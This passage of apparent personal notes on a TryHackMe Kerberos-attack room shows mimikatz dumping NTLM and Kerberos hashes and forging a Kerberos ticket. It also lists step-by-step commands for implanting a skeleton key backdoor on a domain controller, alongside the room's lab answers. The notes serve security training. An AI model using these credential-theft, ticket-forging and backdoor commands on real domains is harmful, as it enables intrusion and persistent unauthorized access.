+      des_cbc_md5       (4096) : 5d5dae0dc10e7aec
+
+ * NTLM-Strong-NTOWF
+    Random Value : 7e9547ab69f52e42450903ebbe6ad6ec
+```
+What is the SQLService NTLM Hash? *cd40c9ed96265531b21fc5b1dafcfb0a*
+```text
+mimikatz # lsadump::lsa /inject /name:Administrator
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860
+
+RID  : 000001f4 (500)
+User : Administrator
+
+ * Primary
+    NTLM : 2777b7fec870e04dda00cd7260f7bee6
+    LM   :
+  Hash NTLM: 2777b7fec870e04dda00cd7260f7bee6
+
+ * Kerberos
+    Default Salt : WIN-G83IJFV2N03Administrator
+    Credentials
+      des_cbc_md5       : 918abaf7dcb02ce6
+
+ * Kerberos-Newer-Keys
+    Default Salt : WIN-G83IJFV2N03Administrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 42b3c13c8c0fef3175eb2b5926f805f919123efd001a9c5a16ee9a86101e32b4
+      aes128_hmac       (4096) : d01d6ccf97a2ee214ec7185173a3b659
+      des_cbc_md5       (4096) : 918abaf7dcb02ce6
+
+ * NTLM-Strong-NTOWF
+    Random Value : 7bfd4ae86442827fb0db294d5c9855ce
+```
+What is the Administrator NTLM Hash? *2777b7fec870e04dda00cd7260f7bee6*
+*creating a silver ticket*
+```text
+mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103
+User      : Administrator
+Domain    : controller.local (CONTROLLER)
+SID       : S-1-5-21-432953485-3795405108-1502158860
+User Id   : 1103
+Groups Id : *513 512 520 518 519
+ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
+Lifetime  : 8/20/2022 12:23:32 PM ; 8/17/2032 12:23:32 PM ; 8/17/2032 12:23:32 PM
+-> Ticket : ticket.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+```
+[kerberos-ticket](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
+### Kerberos Backdoors w/ mimikatz
+Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.
+The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.
+The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"
+This will only be an overview section and will not require you to do anything on the machine however I encourage you to continue yourself and add other machines and test using skeleton keys with mimikatz.
+Skeleton Key Overview -
+The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.
+![](https://i.imgur.com/yNI0zEb.png)
+Preparing Mimikatz -
+1.) cd Downloads && mimikatz.exe - Navigate to the directory mimikatz is in and run mimikatz
+2.) privilege::debug - This should be a standard for running mimikatz as mimikatz needs local administrator access
+Installing the Skeleton Key w/ mimikatz -
+1.) misc::skeleton - Yes! that's it but don't underestimate this small command it is very powerful
+Accessing the forest -
+The default credentials will be: "mimikatz"
+example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password
+example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
+The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.
+I understand how to implant a skeleton key into a domain controller with mimikatz
+*No answer needed*
+[skeleton-key](https://pentestlab.blog/2018/04/10/skeleton-key/)
+### Conclusion
+We've gone through everything from the initial enumeration of Kerberos, dumping tickets, pass the ticket attacks, kerberoasting, AS-REP roasting, implanting skeleton keys, and golden/silver tickets. I encourage you to go out and do some more research on these different types of attacks and really find what makes them tick and find the multitude of different tools and frameworks out there designed for attacking Kerberos as well as active directory as a whole.
+You should now have the basic knowledge to go into an engagement and be able to use Kerberos as an attack vector for both exploitations as well as privilege escalation.
+Know that you have the knowledge needed to attack Kerberos I encourage you to configure your own active directory lab on your network and try out these attacks on your own to really get an understanding of how these attacks work.
+Resources -
+https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
+https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
+https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
+https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
+https://www.varonis.com/blog/kerberos-authentication-explained/
+https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
+https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
+https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf
+I Understand the Basics of Attacking Kerberos *No answer needed*
+![](https://tryhackme-certificates.s3-eu-west-1.amazonaws.com/THM-CITHCJJRZD.png)
+
+## Notes / Lessons Learned
+[[Active Directory Basics]]
+
